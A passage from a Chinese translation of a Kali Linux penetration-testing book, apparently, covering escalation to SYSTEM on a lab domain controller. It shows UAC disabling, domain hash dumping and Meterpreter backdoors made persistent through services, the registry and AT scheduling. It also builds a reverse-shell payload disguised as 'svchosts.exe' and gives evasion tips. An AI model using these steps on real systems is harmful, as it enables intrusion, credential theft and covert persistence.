`svchosts.exe`：这将启动利用程序，您将看到 Kali 上的会话打开。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/d6900f6e-7ed2-497f-b918-c2725400060b.png)

我们回到我们的 VBS 绕过利用程序，并针对这个会话运行它。哦不！我们像在 BO-SRV2 上一样又失败了：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/4307a3d4-fdf1-4d85-8f70-149ad195fee2.png)

现在，似乎所有服务器的安全性都针对所有用户帐户设置为高。我们需要摆脱这个讨厌的 UAC。这很可能也是我们的其他尝试失败的原因。当利用程序自动运行时，它们会被 UAC 阻止。我们需要禁用 UAC 并将其排除在外。由于我们有一个 RDP 会话和一些对机器有一些权限的帐户，我们将使用 GUI 来禁用 UAC，如下所示：

1.  前往控制面板。

1.  选择用户帐户。

1.  单击打开或关闭用户帐户控制。 

1.  点击通过 UAC 窗口。

1.  接下来，取消复选框。

1.  按下确定。

1.  然后会要求您重新启动计算机；继续。

1.  下面的截图显示了 UAC 窗口：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/5ae59f16-97fc-4a0a-9ac8-676d4444fc87.png)

您可能会想为什么我们没有在 BO-SRV2 上这样做。足迹显示，BO-SRV2 是网络上的文件服务器。重新启动此系统可能会提醒用户我们的存在。网络可能只有一个文件服务器，因此如果重新启动它，就会被注意到，但域控制器是另一回事。我们可以重新启动此系统，没有人会知道，除非网络上有一个可以告诉我们的网络监控服务。至少，在重新启动域控制器时被抓住的机会较小。哦，是的；在重新启动机器之前，右键单击任务栏，转到任务管理器，并检查用户选项卡，确保您是唯一一个在盒子上的人。在管理员在盒子上时重新启动将意味着您被抓住了。我们可以在下面的截图中看到，我们现在是系统上唯一的一个人，所以安全地重新启动：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/4db6dca3-7c50-415c-878f-a92fa617accd.png)

现在，重新启动后我们重新开始这个过程。确保您的 Kali 机器上的多/处理程序设置正确并运行。重新登录受害者的机器，并重新运行您的有效载荷：

```
C:\Windows\Temp\svchosts.exe  
```

然后您将看到 Meterpreter 会话在您的 Kali 盒子上启动，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/2716de20-95ce-49fa-bf72-3e9b8878f8fa.png)

好吧，让我们看看这次我们得到了什么！打开我们的 Meterpreter 会话，看看发生了什么。要打开会话，请执行以下操作：

+   `sessions -i 2`: `-i` 是与编号会话进行交互

+   `getuid`: 这显示我们正在以 `fflintstone` 身份运行

这只是为了好玩，因为上次运行它没有起作用。

+   `getsystem`: 中了！我们有赢家！当我们重新运行 `getuid` 时，我们看到我们现在是系统。是的，起身跳起您的快乐舞蹈：您现在拥有系统级别的特权！它完全被控制了：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/47855e4d-9bf9-4358-a17e-969ec44e82cd.png)

因此，我们已经发现问题一直是 UAC，并且我们没有能力绕过通常出现在屏幕上的提示。即使具有管理员级别的访问权限，UAC 提示也会破坏我们完全攻陷机器的尝试。

因此，让我们掠夺系统并收集我们的战利品。作为域控制器，它掌握着王国的钥匙。在渗透测试中，一旦被掠夺，游戏就结束了。在真实世界的黑客攻击中，一旦实现了这一点，您的网络就完蛋了；除非完全重建整个网络结构，否则您永远无法确定您的攻击者完全被锁在外面。为此，我们将使用 `post` 模块来收集所有用户帐户及其哈希。为此，我们将使用 `post/windows/gather/smart_hashdump` 模块。

此模块的信息如下：

```
    msf post(smart_hashdump) > info

    Name: Windows Gather Local and Domain Controller Account Password Hashes
    Module: post/windows/gather/smart_hashdump
    Platform: Windows
    Arch: 
    Rank: Normal

    Provided by:
    Carlos Perez <carlos_perez@darkoperator.com>

    Basic options:
    Name  Current Setting Required Description
    ----  --------------- -------- -----------
    GETSYSTEM false   no  Attempt to get SYSTEM privilege on the target host.
    SESSION      yes  The session to run this module on.

    Description:
    This will dump local accounts from the SAM Database. If the target 
    host is a Domain Controller, it will dump the Domain Account 
    Database using the proper technique depending on privilege level, OS 
    and role of the host.

```

在设置和运行此模块之前，我们首先要退出 Meterpreter shell，而不中断连接，然后加载 post 模块并运行它。

从正在运行的 Metetpreter shell 中运行这些命令：

+   `background`: 这将使会话后台运行而不终止它。

+   `use post/windows/gather/smart_hashdump`: 这将加载 `smart_hashdump` 模块。

+   `show options`: 这将显示所需的选项。

+   `set SESSION 2`: 这将设置会话以使用我们正在运行的会话。

+   `show options`: 再次运行此命令以检查您的设置。

+   `利用`: 利用!!

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/0d84fc61-e734-49c4-ae15-d501d97ab5b5.png)

中了！您现在是 `LAB1.boweaver.net` 域的自豪所有者。请注意，域中的所有哈希，包括机器帐户，都已被掠夺。这些哈希不是经过盐处理的，不像使用 NTLMv2 在线捕获的哈希，后者是经过盐处理且不可重放的。这些是直接的 NTLM 哈希，可以用于**传递哈希**风格的攻击和登录到其他系统。它们也可以更容易地使用离线密码破解工具进行破解，以获取明文密码。

还要注意，凭证不仅已保存到 Metasploit 数据库中，还输出到了位于 `/root/.msf4/loot/20170709202230_lab1.boweaver.ne_172.16.42.5_windows.hashes_075027.txt` 的文件中。这个文本文件是以一种格式保存的，可以导入到 John 或 Hashcat 进行离线破解。

以下截图显示了本书的测试域的结果，因此输出并不那么大。在大型域中，这可能是一个非常大的转储：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/06396ab8-5349-4250-8e14-f81383e4aba2.png)

黑客提示：

在转储大型域时，有时可以找到已禁用的帐户。最好启用其中一个帐户进行攻击使用，并提升此帐户的特权，而不是添加新的帐户进行攻击使用。

# 维持访问

一旦你获得了访问权限并提升了你的访问级别，你会想要回来。如果系统是通过对互联网开放端口的漏洞而被入侵的，那么返回就不是一个大问题，除非系统被修补。你可以随时重复利用你的漏洞，并重新获得对内部网络的访问权限。如果你使用钓鱼攻击或浏览器漏洞来攻击系统，那么你的连接只会发生一次，当链接被点击时，或者从被感染的网站运行浏览器漏洞时。以这些方式攻击用户的工作站，为了返回工作站并绕过防火墙，你需要一些东西来维持访问。对于配置良好的防火墙后面的系统来说，几乎不可能在没有任何对互联网开放的端口的情况下直接获得访问权限。然而，所有系统都可以呼叫互联网，所以这是我们的攻击向量和我们返回的方式。这就是为什么高度安全的网络应该始终是空气隔离的，没有物理方式呼叫公共网络。这就是小而毛茸茸、尾巴长、耳朵大的哺乳动物发挥作用的地方。

# 远程访问工具

**远程访问工具**（**RATs**）是一种可以用来呼叫服务器并维持与该服务器的连接的小型程序，有时被称为**命令和控制**服务器，或 CnC。使用来自服务器的连接，攻击者可以从内部机器访问受害者的内部网络，或者使用它作为一个 Pivot 来从攻击者的远程机器上攻击网络。

Pivots 是我个人最喜欢的。有了 Pivots，就不需要将工具上传到另一个受害者的机器上，这可能会触发反病毒软件和其他安全监控工作站在上传过程中。一旦 RAT 就位，你现在可以从第一个受害者的机器上进行 Pivot。此外，将像 Metasploit 这样的版本上传并安装到受害者的机器上是不切实际的。有了 Pivot，就不需要上传工具：你可以使用你系统上安装的工具来对内部受害者网络进行攻击，就像你插入内部网络一样。受害者的机器现在只是作为一个路由器，你的远程 Kali 机器现在位于内部网络上。Metasploit 内置了一些方便的 Pivots。还要记住，如果网络可以从无线接入点被入侵，那么你也可以完全访问内部网络，所以没有必要进行 Pivot。

如今有成千上万的 RAT 可用于任何系统，不仅仅是 Windows。Android RAT 如今也被广泛用于入侵手机和平板电脑，并维持对这些设备的访问。我们将使用 Metasploit 的 MSFvenom 工具来定制一些 RAT。我发现这些效果最好，其他工具，如 Mimikats，可以通过连接运行。

# Metasploit 的 persistence_exe 模块

我们首先要使用我们现有的会话，将一个持久的可执行文件加载到系统上，这将继续呼叫我们的多/handler。由于我们已经有了这个会话，并且它具有系统级别的访问权限，加载这个将会很容易。要加载模块，运行以下命令：

```
use post/windows/manage/persistence_exe
```

`persistence_exe`模块的信息如下：

```
    msf post(persistence_exe) > info

    Name: Windows Manage Persistent EXE Payload Installer
    Module: post/windows/manage/persistence_exe
    Platform: Windows
    Arch: 
    Rank: Normal

    Provided by:
    Merlyn drforbin Cousins <drforbin6@gmail.com>

    Basic options:
    Name  Current Setting Required Description
    ----  --------------- -------- -----------
    REXENAME default.exe  yes  The name to call exe on remote system
    REXEPATH     yes  The remote executable to use.
    SESSION     yes  The session to run this module on.
    STARTUP USER    yes  Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)

    Description:
    This Module will upload a executable to a remote host and make it 
    Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER 
    will start on user login, SYSTEM will start on system boot but 
    requires privs. SERVICE will create a new service that will start the payload. Again requires privs.

```

我们看到 RAT 的名称设置为`REXENAME`为`default.exe`。如果有人在审核进程列表，这将显得像一个恶意进程，所以让我们为它改个名字，更隐蔽一点。早些时候，我们构建了我们的有效载荷`svchosts.exe`。注意这个名字与已知运行的`svchost`可执行文件非常接近，这个文件在正常运行的服务器的运行进程中会出现很多次。名字接近实际服务名将使它更隐蔽一些。当我们有一个已知的有效利用时，为什么要构建一个新的有效载荷呢？

设置模块如下：

```
set REXENAME svchosts.exe
set REXEPATH /media/root/files/kali2016-2-book/chap8/svchosts.exe
set SESSION 2
set STARTUP SERVICE
show options
exploit
```

我们看到它已经上传了 RAT 并且未能打开系统管理器，回复说 RPC 服务器不可用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/ed6bdb62-75a9-4988-b91d-c8b5dd19ae0b.png)

在域控制器上，我们可以看到一个应用程序崩溃并且桌面上弹出了一个警告。在试图隐蔽时，这不是一件好事：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/891006ee-ba1f-4bba-bb82-27ebdbf6255a.png)

错误显示应用程序 ApacheBench 已崩溃。此计算机未加载 Apache Web 服务器，因此错误可能来自我们正在使用的 HTTPS 有效负载。因此，让我们构建另一个有效负载，以用作 RAT，使用直接的 TCP 连接。要从命令行构建有效负载，请运行以下命令：

```
msfvenom -p windows/meterpreter_reverse_tcp --platform windows -f exe -a x86 LHOST=172.16.42.215 LPORT=4444 -o svchosts2.exe

```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/b64246ba-c993-433b-9952-46cb6cad20ed.png)

我们需要为此有效负载设置一个多/处理程序：

```
use post/windows/manage/persistence_exe
set PAYLOAD windows/meterpreter_reverse_tcp
set LPORT 4444
run -j
```

现在使用以下命令返回到持久性模块：

```
use post/windows/manage/persistence_exe  
```

为新有效负载重置`REXEPATH`：

```
set REXEPATH /media/bo/files/kali2016-2-book/chap8/svchosts2.exe
show options # To check the settings then.
Exploit  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/4bba8433-d724-4e24-93c6-9f43af76cb35.png)

正如我们所看到的，这次有效负载成功运行并打开了一个新的会话。我们还看到，RPC 服务器再次不可用，因此 RAT 没有作为服务加载。因此，RAT 很可能没有作为服务运行。作为服务运行是最理想的，但由于它给我们带来了问题，让我们将`STARTUP`设置为`USER`。使用此配置，我们必须等待用户再次登录才能运行漏洞利用。在使用此设置时，最好使用经常使用的帐户。检查事件日志将为您提供有关哪些用户登录以及登录频率的信息。

确保终止上次运行创建的会话，然后将`STARTUP`设置更改如下：

```
set STARTUP USER
show options
exploit  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/32d1dc7c-4825-4f01-84a7-f40d8fe64ce9.png)

成功！在此运行中，模块加载了有效负载并将其设置为自动运行，所以我们应该可以继续进行。让我们测试结果。当我们运行此漏洞时，我们没有重新启动我们的多/处理程序来捕获有效负载，因为它之前已经运行过。我们可以看到没有会话被创建，即使其他一切都显示漏洞的成功运行。当我们设置并运行处理程序时，我们立即从有效负载获得连接：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/97b782d7-de9d-4836-97f8-9eaae4bc8ac8.png)

让我们检查下次登录时是否重新连接。终止系统中的所有会话并注销 RDP 会话。接下来，重新启动多/处理程序以进行下次登录：

```
sessions -K # This kills all running sessions.
run -j # This restarts the handler.  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/0510cba3-bafb-40db-856a-25dc8c5388f4.png)

当我们使用 RDP 会话重新登录时，我们看到一个新的会话已经在运行的处理程序上启动。我们能够与会话交互，并从 Meterpreter shell 获得系统访问权限：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/dbf0a99b-45a3-4bde-89f9-df5488300aa5.png)

# 仅限 Windows 注册表的持久性

Windows 注册表是隐藏恶意代码的好地方。许多恶意软件和间谍软件使用这样的方法来隐藏和运行它们的有效负载。注册表的复杂性和注册表的系统访问级别使其成为一个很好的攻击向量。

我们将在当前运行的会话上运行以下模块，并尝试以系统级访问权限运行有效负载。模块的信息如下：

```
    msf exploit(registry_persistence) > info

    Name: Windows Registry Only Persistence
    Module: exploit/windows/local/registry_persistence
    Platform: Windows
    Privileged: No
    License: Metasploit Framework License (BSD)
    Rank: Excellent
    Disclosed: 2015-07-01

    Provided by:
    Donny Maasland <donny.maasland@fox-it.com>

    Available targets:
    Id Name
    -- ----
    0 Automatic

    Basic options:
    Name   Current Setting Required Description
    ----   --------------- -------- -----------
    BLOB_REG_KEY     no  The registry key to use for storing the payload blob. (Default: random)
    BLOB_REG_NAME     no  The name to use for storing the payload blob. (Default: random)
    CREATE_RC  true    no  Create a resource file for cleanup
    RUN_NAME      no  The name to use for the 'Run' key. (Default: random)
    SESSION       yes  The session to run this module on.
    SLEEP_TIME  0    no  Amount of time to sleep (in seconds) before executing payload. (Default: 0)
    STARTUP  USER    yes  Startup type for the persistent payload. (Accepted: USER, SYSTEM)

    Payload information:

    Description:
    This module will install a payload that is executed during boot. It 
    will be executed either at user logon or system startup via the 
    registry value in "CurrentVersion\Run" (depending on privilege and 
    selected method). The payload will be installed completely in 
    registry.

```

让模块使用默认设置运行大部分设置。我们将使用以下命令运行：

+   `set SESSION 4`：设置为当前运行的会话

+   `set STARTUP SYSTEM`：这将设置持久有效负载以作为系统漏洞运行

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/159b1ea5-1ef9-462c-972b-78f3dad47c98.png)

看来我们的漏洞利用失败了。我们收到了 PowerShell 不可用的警告。漏洞利用确实写入了注册表，但请注意，当运行完成时没有启动新会话。这告诉我们，由于未找到 PowerShell，我们的运行失败了。由于找不到 PowerShell，让我们尝试通过从运行会话的 Meterpreter shell 添加持久性并从 VB 脚本运行漏洞利用的旧方法。

需要记住的是，这种类型的利用不需要登录，因此在生产系统上，如果不删除，这将是一个开放的后门，并且如果在机器上继续运行，另一个攻击者可以访问它。

您可以通过从运行的 Meterpreter 会话中运行以下命令来阅读持久性脚本的帮助文件。正如您所看到的，持久性脚本被列为已弃用，但由于较新的后期利用未能奏效，最好回退到较旧的方法：

```
    sessions -i 4 Interact with the running session.
    run persistence -h To view the help files.

    meterpreter > run persistence -h

    [!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
    [!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
    Meterpreter Script for creating a persistent backdoor on a target host.

    OPTIONS:

    -A  Automatically start a matching exploit/multi/handler to connect to the agent
    -L <opt> Location in target host to write payload to, if none %TEMP% will be used.
    -P <opt> Payload to use, default is windows/meterpreter/reverse_tcp.
    -S  Automatically start the agent on boot as a service (with SYSTEM privileges)
    -T <opt> Alternate executable template to use
    -U  Automatically start the agent when the User logs on
    -X  Automatically start the agent when the system boots
    -h  This help menu
    -i <opt> The interval in seconds between each connection attempt
    -p <opt> The port on which the system running Metasploit is listening
    -r <opt> The IP of the system running Metasploit listening for the connect back  
```

为了设置这个，我们将使用以下设置：

```
run persistence -U -S -i 15 -p 4444 -r 172.16.42.215  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/d72f78a3-71d8-47c7-9ac6-1c48d6211492.png)

哦好吧；不可用的 RPC 服务再次让我们失望，所以让我们尝试一个更古老的方法：`AT`命令。`AT`命令是任务计划程序，可以追溯到 NT 3.51 的时代，只能从命令行运行。这也使它具有一些隐蔽性，因为使用`AT`调度的任务不会显示在任务计划程序的 GUI 版本中。它们是两个独立的应用程序，不共享作业。AT 服务很像 Linux 和 UNIX 上的 Cron。这些系统上也有一个`AT`调度程序。

因此，要从 Meterpreter 转到远程 shell，请运行此命令：

```
Shell  
```

首先，将有效载荷从`Temp`目录移动到`Windows`目录，这样有效载荷将在不使用完整路径的情况下运行：

```
copy C:\Windows\Temp\server.exe C:\Windows\server.exe  
```

从远程 shell 中运行以下命令，以确保计划程序服务正在运行：

```
net start "task scheduler"
at 23:30 /every:M,T,W,TH,F,SA,SU server.exe  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/960aafe0-61b8-4baf-844d-68f778c06563.png)

请记住在设置时间之前启动 multi/handler。当时间到来时，我们会看到我们现在有一个新的运行会话：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/ecfea210-5743-459a-b611-c2d156936c64.png)

# 总结

在本章中，我们已经学会了如何在本地和远程提升权限。我们展示了即使利用出现问题也可以成为学习经验，并且可以为我们提供有关目标及其目标网络的宝贵信息。我们已经学会了在攻击系统中保持持久性的几种方法，并且学会了如何隐藏这些有效载荷。我们已经学会了如何禁用 UAC 并绕过其安全性。

我们已经学会了如何构建有效载荷，将其带入我们受损的系统，并将其用于将我们的权限从普通用户帐户提升到 Windows 系统上的系统级访问。我们还学会了如何设置此有效载荷以在我们受攻击的机器上持久运行，以便我们以后可以返回到同一受损的机器。我们还从未能成功入侵系统中获取知识的宝贵教训，并利用这些知识获得对机器的完全访问权限。失败也可以是成功。
